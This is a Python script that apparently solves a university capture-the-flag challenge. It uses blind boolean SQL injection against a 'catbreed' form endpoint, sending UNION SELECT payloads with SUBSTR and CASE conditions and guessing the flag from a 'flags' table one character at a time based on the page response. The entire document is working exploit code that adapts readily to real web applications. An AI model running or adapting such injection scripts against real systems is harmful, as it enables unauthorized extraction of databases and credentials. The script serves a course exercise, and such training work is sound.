import requests

url = "http://cs2107-ctfd-i.comp.nus.edu.sg:8081/catbreed"
flag = ""

# Characters allowed in the flag
characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"

# Loop through each character position of the flag
for i in range(1, 100):  # Assume the flag has a maximum length of 100
    found = False
    for char in characters:
        payload = f"' UNION SELECT id, flag FROM flags WHERE CASE WHEN SUBSTR(flag, {i}, 1) = '{char}' THEN (1=1) ELSE (1=2) END--"
        data = {"breed": payload}
        response = requests.post(url, data=data)
        if "Cat breed exists!" in response.text:
            flag += char
            break
    if flag[-1] == '}': # Early stopping
        break

print(flag)
